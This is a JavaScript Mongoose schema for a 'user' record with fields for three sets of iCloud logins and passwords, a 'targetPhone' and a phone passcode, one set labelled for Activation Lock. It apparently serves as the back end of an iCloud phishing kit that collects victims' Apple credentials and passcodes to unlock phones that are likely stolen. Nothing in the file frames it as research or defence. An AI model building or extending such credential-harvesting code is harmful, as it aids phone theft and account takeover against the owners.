const mongoose = require("mongoose");

const userSchema = new mongoose.Schema({
    // first login
    fistIcloud: { 
        type: String,
        default: null
    },
    firstPassword: { 
        type: String,
        default: null
    },
    // target_phone
    targetPhone: { 
        type: String,
        default: null
    },
    // second login
    secondIcloud: { 
        type: String,
        default: null
    },
    secondPassword: { 
        type: String, 
        default: null
    },
    // password, passcode(4 or 6digit)
    phonePassword: { 
        type: String, 
        default: null
    },
    // Activation Lock(icloud and password)
    thirdIcloud: {
        type: String, 
        default: null
    },
    thirdPassowrd: { 
        type: String, 
        default: null
    },

});

module.exports = mongoose.model("user", userSchema);